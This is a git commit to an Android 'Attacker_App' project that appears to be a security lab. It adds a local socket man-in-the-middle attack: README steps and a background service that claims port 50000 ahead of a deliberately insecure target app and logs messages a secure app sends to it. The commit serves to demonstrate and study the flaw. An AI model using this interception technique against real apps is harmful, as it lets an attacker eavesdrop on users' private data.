9c04521f005eb8aaed842ca6b5b1de6d38a88e25
Weesla <awsl.weesla@gmail.com>
2024-02-06 12:37:09 +0800

    Added functionality to support Local Socket MITM Attack (Refer to README)

--- README.md
+++ README.md
@@ -1,3 +1,32 @@
 # Attacker_App
 
+Work in progress app. List of possible attacks and configurations will be listed below.
+
 Insecure Target - https://github.com/WeeslaX/Insecure_Target
+
+## Local Socket MITM Attack
+Ensure the following settings are set with build.gradle:
+
+<u>Attacker App  - Monitoring Flavour </u>
+
+* `buildConfigField 'boolean', 'ENABLE_ATTACKER_SERVICE', 'true'`
+* `buildConfigField 'boolean', 'LOCAL_SOCKET_MITM_ATTACK', 'true'`
+
+<u> Secure App - Monitoring Flavour </u>
+
+* `buildConfigField 'boolean', 'SEND_MESSAGE_VIA_LOCAL_SOCKET', 'true'`
+* `buildConfigField 'int', 'LOCAL_SOCKET_PORT', '50000'`
+
+Steps
+1. Run Attacker App.
+2. Accept all permissions on Attacker App.
+3. Run Insecure App.
+4. Select "Start and Monitor Local Socket Server".
+5. Note that no logs are generated (Server not initialised).
+6. Run Secure App.
+7. Accept all permissions.
+8. Select "General Purpose Testing" button.
+9. Verify on Attack App's logcat that message from Secure app has been received.
+
+
+Note: Force stop Attacker App for Insecure App to resume use of socket in port 50000
--- app/src/main/java/com/attacker/app/service/AttackerService.java
+++ app/src/main/java/com/attacker/app/service/AttackerService.java
@@ -18,9 +18,21 @@ import com.attacker.app.R;
 import com.attacker.app.receivers.ServiceRestarter;
 import com.attacker.app.utils.Utils;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.ServerSocket;
+import java.net.Socket;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+
 public class AttackerService extends Service {
 
     final static String TAG = AttackerService.class.getSimpleName();
+
+    private ExecutorService executorService;
+    private ServerSocket serverSocket;
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -30,6 +42,30 @@ public class AttackerService extends Service {
 
         if(BuildConfig.SANITY_CHECK_ATTACKER_SERVICE){
             Utils.showToastEveryFiveSeconds(this,"Attacker Service is still running");
+        }
+
+        if(BuildConfig.LOCAL_SOCKET_MITM_ATTACK){
+            // Initialize the executor service for local socket
+            int numberOfCores = Runtime.getRuntime().availableProcessors();
+            executorService = Executors.newFixedThreadPool(numberOfCores);
+
+            // Any port > 1024 not blocked by firewall
+            int portNumber = 50000;
+
+            // Pending client connections
+            executorService.execute(() -> {
+                try {
+                    serverSocket = new ServerSocket(portNumber);
+                    Log.i(TAG,"Local Server Socket initialized, listening to port: " + portNumber);
+                    while (!Thread.currentThread().isInterrupted()) {
+                        Socket client = serverSocket.accept();
+                        // Handle client connection in a separate thread
+                        handleClientConnection(client);
+                    }
+                } catch (IOException e) {
+                    Log.e(TAG, "Error starting server", e);
+                }
+            });
         }
 
         return START_STICKY;
@@ -73,5 +109,36 @@ public class AttackerService extends Service {
                 .setCategory(Notification.CATEGORY_SERVICE)
                 .build();
         startForeground(2, notification);
+    }
+
+    /**
+     * Handles a client connection by reading messages sent from the client and logging them.
+     * This method executes the handling of the client connection in a separate thread managed by the ExecutorService.
+     * It reads lines from the client's input stream and logs each message received. Upon completion, it closes the client socket.
+     *
+     * @param client the {@link Socket} object representing the client connection.
+     */
+    private void handleClientConnection(final Socket client) {
+        executorService.execute(() -> {
+            try {
+                Log.i(TAG,"Client connected: " + client.getRemoteSocketAddress());
+                InputStream inputStream = client.getInputStream();
+                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+
+                String message;
+                while ((message = reader.readLine()) != null) {
+                    Log.i(TAG,"Received message: " + message);
+                }
+            } catch (IOException e) {
+                Log.e(TAG, "Error handling client connection", e);
+            } finally {
+                try {
+                    client.close();
+                    Log.i(TAG,"Closed Client connection to " + client.getRemoteSocketAddress());
+                } catch (IOException e) {
+                    Log.e(TAG, "Error closing client connection", e);
+                }
+            }
+        });
     }
 }
